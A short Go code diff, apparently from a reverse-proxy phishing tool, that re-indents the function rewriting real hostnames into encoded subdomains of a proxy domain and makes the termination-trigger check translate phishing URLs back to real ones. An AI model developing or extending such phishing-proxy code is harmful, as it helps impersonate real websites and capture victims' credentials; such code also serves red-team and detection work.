@@ -126,12 +126,13 @@ func RealURLtoPhish(realURL string) string {
 		out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
 	} else {
 
-	if strings.Contains(realURL,  TopLevelDomain) { //subdomain in main domain
-		out = strings.Replace(out, string( TopLevelDomain), ProxyDomain, 1)
-	} else if realURL != "" {
-		encoded, _ :=  EncodeSubdomain(host,tls)
-		out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
-	}}
+		if strings.Contains(realURL,  TopLevelDomain) { //subdomain in main domain
+			out = strings.Replace(out, string( TopLevelDomain), ProxyDomain, 1)
+		} else if realURL != "" {
+			encoded, _ :=  EncodeSubdomain(host,tls)
+			out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
+		}
+	}
 
 	return out
 }
@@ -173,6 +174,8 @@ func PhishURLToRealURL(phishURL string) string {
 
 //check if the requested URL matches termination URLS patterns and returns verdict
 func CheckTermination(input string) bool {
+
+	input = PhishURLToRealURL(input)
 
 	if len(TerminateTriggers) > 0 {
 		for _, pattern := range TerminateTriggers {
